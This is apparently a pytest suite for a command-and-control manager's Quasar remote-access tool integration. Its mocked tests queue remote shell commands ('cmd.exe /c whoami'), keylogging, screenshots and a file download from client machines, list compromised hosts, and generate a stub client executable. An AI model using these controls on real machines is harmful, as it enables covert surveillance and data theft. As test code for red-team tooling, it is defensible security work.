"""Tests QuasarC2 — TCP binary protocol + REST API wrapper."""
from __future__ import annotations

import json
import struct
import zlib
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from c2_manager.integrations.quasar import QuasarC2, _MSG_RUN_PROCESS, _MSG_SCREENSHOT, _MSG_KEYLOGGER_ON
from c2_manager.models import C2Config, C2Type, C2Status
from c2_manager.models.payload import PayloadConfig
from tests.c2_manager.conftest import make_resp


@pytest.fixture
def quasar_api_config() -> C2Config:
    return C2Config(
        name="test-quasar-api",
        c2_type=C2Type.QUASAR,
        host="127.0.0.1",
        port=4782,
        extra={"mode": "api", "api_key": "qsr-key", "verify_ssl": False},
    )


@pytest.fixture
def quasar_tcp_config() -> C2Config:
    return C2Config(
        name="test-quasar-tcp",
        c2_type=C2Type.QUASAR,
        host="127.0.0.1",
        port=4782,
        ssl=False,
        extra={"mode": "tcp"},
    )


@pytest.fixture
def quasar_api(quasar_api_config):
    q = QuasarC2()
    q._config = quasar_api_config
    q._status = C2Status.CONNECTED
    q._mode   = "api"
    q._client = AsyncMock()
    q._token  = "qsr-key"
    return q


@pytest.fixture
def quasar_tcp(quasar_tcp_config):
    q = QuasarC2()
    q._config     = quasar_tcp_config
    q._status     = C2Status.CONNECTED
    q._mode       = "tcp"
    q._tcp_reader = AsyncMock()
    q._tcp_writer = AsyncMock()
    q._tcp_writer.is_closing = MagicMock(return_value=False)
    return q


def make_tcp_resp(data: dict) -> tuple[bytes, bytes]:
    """Crée les bytes header+body d'une réponse TCP Quasar."""
    body = zlib.compress(json.dumps(data).encode())
    header = struct.pack(">I", len(body))
    return header, body


# ── Connexion ─────────────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_connect_api(quasar_api_config):
    q = QuasarC2()
    with patch("httpx.AsyncClient") as mock_cls:
        mock_client = AsyncMock()
        mock_client.get = AsyncMock(return_value=make_resp(200, {"status": "ok"}))
        mock_cls.return_value = mock_client
        result = await q._connect_api(quasar_api_config)
    assert result is True
    assert q._status == C2Status.CONNECTED


# ── Paquet TCP ────────────────────────────────────────────────────────────────

def test_pack_packet():
    q = QuasarC2()
    packet = q._pack_packet(0x01, {"test": "data"})
    length = struct.unpack(">I", packet[:4])[0]
    body   = zlib.decompress(packet[4:])
    parsed = json.loads(body)
    assert parsed["type"] == 0x01
    assert parsed["test"] == "data"
    assert length == len(packet) - 4


# ── Listeners ─────────────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_create_listener_api(quasar_api):
    quasar_api._client.post = AsyncMock(return_value=make_resp(201, {
        "id": "l-1", "active": True,
    }))
    listener = await quasar_api.create_listener({
        "bind_host": "0.0.0.0",
        "bind_port": 4782,
        "name": "quasar-ssl",
        "ssl": True,
    })
    assert listener.id == "l-1"
    assert listener.bind_port == 4782
    assert listener.protocol == "ssl-tcp"


@pytest.mark.asyncio
async def test_create_listener_no_ssl(quasar_api):
    quasar_api._client.post = AsyncMock(return_value=make_resp(201, {
        "id": "l-2", "active": True,
    }))
    listener = await quasar_api.create_listener({
        "bind_port": 4783,
        "ssl": False,
    })
    assert listener.protocol == "tcp"


@pytest.mark.asyncio
async def test_list_listeners_api(quasar_api):
    quasar_api._client.get = AsyncMock(return_value=make_resp(200, {
        "listeners": [
            {"id": "l1", "host": "0.0.0.0", "port": 4782, "ssl": True, "active": True},
        ]
    }))
    listeners = await quasar_api.list_listeners()
    assert len(listeners) == 1
    assert listeners[0].protocol == "ssl-tcp"


@pytest.mark.asyncio
async def test_remove_listener_api(quasar_api):
    quasar_api._client.delete = AsyncMock(return_value=make_resp(204, {}))
    result = await quasar_api.remove_listener("l-1")
    assert result is True


# ── Clients (agents) ──────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_list_agents_api(quasar_api):
    quasar_api._client.get = AsyncMock(return_value=make_resp(200, {
        "clients": [
            {
                "id": "c1",
                "UserAtPCName": "alice@WIN10",
                "PCName": "WIN10",
                "UserName": "alice",
                "EndPoint": "8.8.8.8:12345",
                "LocalIP": "192.168.1.5",
                "OperatingSystem": "Windows 10",
                "CPU": "x64",
                "PID": 5678,
                "Process": "explorer.exe",
                "AccountType": "User",
                "LastSeen": "2024-01-15T12:00:00",
                "ConnectedTime": "2024-01-15T10:00:00",
                "Disconnected": False,
                "Country": "FR",
            }
        ]
    }))
    agents = await quasar_api.list_agents()
    assert len(agents) == 1
    assert agents[0].hostname == "WIN10"
    assert agents[0].integrity == "USER"
    assert agents[0].meta["country"] == "FR"


@pytest.mark.asyncio
async def test_parse_client_admin(quasar_api):
    quasar_api._client.get = AsyncMock(return_value=make_resp(200, {
        "clients": [
            {"id": "c2", "PCName": "SRV", "AccountType": "Administrator",
             "LastSeen": "2024-01-15T12:00:00",
             "ConnectedTime": "2024-01-15T10:00:00", "Disconnected": False}
        ]
    }))
    agents = await quasar_api.list_agents()
    assert agents[0].integrity == "ADMIN"


# ── Commandes ─────────────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_send_task_run_process(quasar_api):
    quasar_api._client.post = AsyncMock(return_value=make_resp(201, {
        "task_id": "t1", "status": "queued",
    }))
    task = await quasar_api.send_task("c1", "shell cmd.exe /c whoami", [])
    assert task.meta["msg_type"] == hex(_MSG_RUN_PROCESS)


@pytest.mark.asyncio
async def test_send_task_screenshot(quasar_api):
    quasar_api._client.post = AsyncMock(return_value=make_resp(201, {
        "task_id": "t2", "status": "queued",
    }))
    task = await quasar_api.send_task("c1", "screenshot", [])
    assert task.meta["msg_type"] == hex(_MSG_SCREENSHOT)


@pytest.mark.asyncio
async def test_send_task_keylog(quasar_api):
    quasar_api._client.post = AsyncMock(return_value=make_resp(201, {
        "task_id": "t3", "status": "queued",
    }))
    task = await quasar_api.send_task("c1", "keylog", [])
    assert task.meta["msg_type"] == hex(_MSG_KEYLOGGER_ON)


@pytest.mark.asyncio
async def test_send_task_download(quasar_api):
    quasar_api._client.post = AsyncMock(return_value=make_resp(201, {
        "task_id": "t4", "status": "queued",
    }))
    task = await quasar_api.send_task("c1", "download C:\\secret.txt", [])
    assert task.command == "download C:\\secret.txt"


@pytest.mark.asyncio
async def test_get_task_result_api(quasar_api):
    quasar_api._client.get = AsyncMock(return_value=make_resp(200, {
        "status": "completed", "output": "nt authority\\system",
    }))
    result = await quasar_api.get_task_result("t1")
    assert result["status"] == "completed"


@pytest.mark.asyncio
async def test_get_task_result_tcp_note(quasar_tcp):
    """Mode TCP : résultats via push, pas de polling."""
    result = await quasar_tcp.get_task_result("t1")
    assert result["status"] == "completed"
    assert "push TCP" in result["note"]


# ── Payload ───────────────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_generate_payload_api(quasar_api):
    import base64
    fake_exe = base64.b64encode(b"MZ\x90\x00fake-quasar").decode()
    quasar_api._client.post = AsyncMock(return_value=make_resp(200, {"data": fake_exe}))
    payload_cfg = PayloadConfig(
        name="quasar-client",
        format="exe",
        extra={"callback_host": "127.0.0.1", "callback_port": 4782},
    )
    payload = await quasar_api.generate_payload(payload_cfg)
    assert payload[:2] == b"MZ"


# ── Guard ─────────────────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_require_connected_guard(quasar_api):
    from c2_manager.interfaces import C2NotConnected
    quasar_api._status = C2Status.DISCONNECTED
    with pytest.raises(C2NotConnected):
        await quasar_api.list_agents()
